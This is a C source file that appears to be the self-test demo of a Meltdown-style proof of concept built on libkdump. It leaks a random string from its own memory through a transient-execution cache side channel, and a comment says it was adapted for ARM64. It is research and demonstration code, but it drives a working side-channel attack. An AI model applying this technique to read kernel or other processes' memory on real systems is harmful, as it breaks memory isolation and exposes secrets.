#include "libkdump.h"
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

const char *strings[] = {
    "If you can read this, at least the manual configuration is working",
    "Generating witty test message...",
    "Go ahead with the real exploit if you dare",
    "Have a good day.",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Pay no attention to the content of this string",
    "Please wait while we steal your secrets...",
    "Would you like fries with that?",
    "(insert random quote here)",
    "Don't panic...",
    "Wait, do you smell something burning?",
    "How did you get here?"};

int main(int argc, char *argv[]) {
  libkdump_config_t config;
  memset(&config, 0, sizeof(libkdump_config_t));

  config.cache_miss_threshold = 100;
  config.measurements = 10;
  config.physical_offset = 0x80000000;

  libkdump_init(config);

  srand(time(NULL));
  const char *test = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
  int index = 0;

  printf("Expect: \x1b[32;1m%s\x1b[0m\n", test);
  printf("   Got: \x1b[33;1m");
  while (index < strlen(test)) {
    // Read using virtual address adapted for ARM64 transient loop
    int value = libkdump_read(libkdump_virt_to_phys((size_t)(test + index)));
    if (!isprint(value)) {
      index++; // Avoid infinite loop on non-printables
      continue;
    }
    printf("%c", value);
    fflush(stdout);
    index++;
  }

  printf("\x1b[0m\n");
  libkdump_cleanup();
  return 0;
}